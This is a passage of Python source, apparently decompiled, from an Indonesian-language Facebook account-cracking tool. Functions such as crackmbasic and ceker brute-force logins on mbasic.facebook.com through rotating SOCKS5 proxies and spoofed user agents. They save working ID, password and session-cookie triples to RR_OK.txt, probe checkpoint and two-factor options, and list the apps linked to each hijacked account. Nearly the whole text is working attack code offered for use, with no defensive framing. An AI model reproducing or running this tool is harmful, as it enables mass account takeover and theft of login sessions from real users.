						infoakun += f'''[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n'''
					print('\n')
					statusok = f'''[bold green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]RR_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1

def crackmbasic(idf, pwv):
	global cp, ok, loop
	bi = random.choice([u, k, kk, b, h, hh])
	pers = loop * 100 / len(id2)
	fff = '%'
	nip = random.choice(prox)
	proxs = {'http': 'socks5://' + nip}
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
	sys.stdout.flush()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa = { 'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1), 'uid': idf, 'next': 'https://mbasic.facebook.com/login/save-device/', 'flow': 'login_no_pin', 'pass': pw}
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			heade = {'connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys() or 'ya' in oprek:
				akun.append(idf + '|' + pw)
				ceker(idf, pw)
				if 'ya' in princp:
					print('\n')
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'RR_CP', **('title',)))
					open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RR_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, 'OK', **('title',)))
					ok += 1
				elif 'ya' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RR_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					user = idf
					infoakun = ''
					session = requests.Session()
					cek2 = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', coki, headapp, **('cookies', 'headers')).text
					cek = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', coki, headapp, **('cookies', 'headers')).text
					infoakun += '\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n'
					apkaktif = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek))
					nok = 1
					for muncul in apkaktif:
						infoakun += f'''[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n'''
						nok += 1
					hit = 0
					infoakun += '\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n'
					apkexp = re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>', str(cek2))
					hit = 0
					for muncul in apkexp:
						hit += 1
						infoakun += f'''[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n'''
					print('\n')
					statusok = f'''[bold green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]RR_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1

def ceker(idf, pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email': idf, 'pass': pw, 'login': 'submit'}, headers=head, allow_redirects=True).text, 'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh', 'jazoest', 'fb_dtsg', 'submit[Continue]', 'checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'): anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, head, **('data', 'headers')).text, 'html.parser')
		print('\r%s++++ %s|%s ----> CP	   %s' % (b, idf, pw, x))
		open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
		cp += 1
		opsi = kent.find_all('option')
		if len(opsi) == 0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
		for opsii in opsi:
			print('\r%s---> %s%s' % (kk, opsii.text, x))
	except Exception as c:
			print('\r%s++++ %s|%s ----> CP	   %s' % (b, idf, pw, x))
			print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s' % (u, x))
			open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
			cp += 1

def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu' % c
	cetak(nel(hu, 'CEK OPSI', **('title',)))
	input(u + '[' + h + '•' + u + '] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id = kes.split('|')[0]
				pw = kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error	  %s' % (b, kes, x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s' % (u, x))
				continue
			bi = random.choice([u, k, kk, b, h, hh])
			print('\r%s---> %s/%s ---> { %s }%s' % (bi, love, len(akun), id, x), ' ', **('end',))
			sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email': id,'pass': pw,'login': 'submit'}, headers=header, allow_redirects=True).text, 'html.parser')
			if 'checkpoint' in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh', 'jazoest', 'fb_dtsg', 'submit[Continue]', 'checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'): anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data, header, **('data', 'headers')).text, 'html.parser')
					print('\r%s++++ %s|%s ----> CP	   %s' % (b, id, pw, x))
					opsi = kent.find_all('option')
					if len(opsi) == 0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)' % (hh, x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s' % (kk, opsii.text, x))
				except:
					print('\r%s++++ %s|%s ----> CP	   %s' % (b, id, pw, x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s' % (u, x))
					if 'c_user' in ses.cookies.get_dict().keys():
						print('\r%s++++ %s|%s ----> OK	   %s' % (h, id, pw, x))
					else:
						print('\r%s++++ %s|%s ----> SALAH	   %s' % (x, id, pw, x))
				love += 1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
	
def cek_apk(session, cookie):
	w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies={'cookie': cookie}).text
	sop = BeautifulSoup(w, 'html.parser')
	x = sop.find('form', method='post')
	game = [i.text for i in x.find_all('h3')]
	if len(game) == 0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
	else:
		for i in range(len(game)):
			print('   %s%s. %s%s' % (H, i + 1, game[i].replace('Ditambahkan pada', ' Ditambahkan pada'), N))
	w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies={'cookie': cookie}).text
	sop = BeautifulSoup(w, 'html.parser')
	x = sop.find('form', method='post')
	game = [i.text for i in x.find_all('h3')]
	if len(game) == 0:
		print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
	else:
		for i in range(len(game)):
			print('   %s%s. %s%s' % (K, i + 1, game[i].replace('Kedaluwarsa', ' Kedaluwarsa'), N))

if __name__ == '__main__':
	try:
		os.system('git pull')
	except:
		pass
	try:
		os.mkdir('OK')
	except:
		pass
	try:
		os.mkdir('CP')
	except:
		pass
	try:
		os.mkdir('DUMP')
	except:
		pass
	try:
		os.system('touch .prox.txt')
	except:
		pass
	Main()

